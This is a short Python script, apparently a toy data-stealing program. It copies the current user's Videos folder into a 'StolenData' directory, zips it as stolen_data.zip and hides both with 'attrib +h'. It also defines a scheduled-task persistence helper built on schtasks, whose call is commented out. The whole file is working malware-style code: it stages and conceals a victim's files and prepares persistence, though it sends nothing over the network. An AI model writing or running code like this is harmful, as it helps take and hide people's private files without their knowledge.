import subprocess
import zipfile
import os
import shutil

def copy_user_videos(source_path, destination_path):
    try:

        videos_source = os.path.join(source_path, 'Videos')
        if os.path.exists(videos_source):
            stolen_data_destination = os.path.join(destination_path, 'StolenData')
            os.makedirs(stolen_data_destination, exist_ok=True)
            videos_destination = stolen_data_destination + '\\Videos'
            shutil.copytree(videos_source, videos_destination)

            zip_folder(stolen_data_destination, destination_path + '\\stolen_data.zip')

    except Exception as e:
        print(f"Error: {e}")

def create_scheduled_task(task_name, executable_path, trigger_time):
    command = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc once /st {trigger_time} /f'
    subprocess.run(command, shell=True)

def zip_folder(folder_path, zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for foldername, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    arcname = os.path.relpath(file_path, folder_path)
                    zip_file.write(file_path, arcname)
        
        subprocess.run(['attrib', '+h', zip_path], check=True)
        subprocess.run(['attrib', '+h', folder_path], check=True)

    except Exception as e:
        print(f"Error: {e}")

def main():
    #task_name = 'OdioDormir'
    #executable_path = 'DummyPath.exe'
    #trigger_time = '12:00'  
    user_profile_path = os.path.expanduser('~')
    destination_folder = os.path.join(user_profile_path, 'Documents')

    copy_user_videos(user_profile_path, destination_folder)
    #Funcion Comentada: create_scheduled_task(task_name, executable_path, trigger_time)

if __name__ == "__main__":
    main()
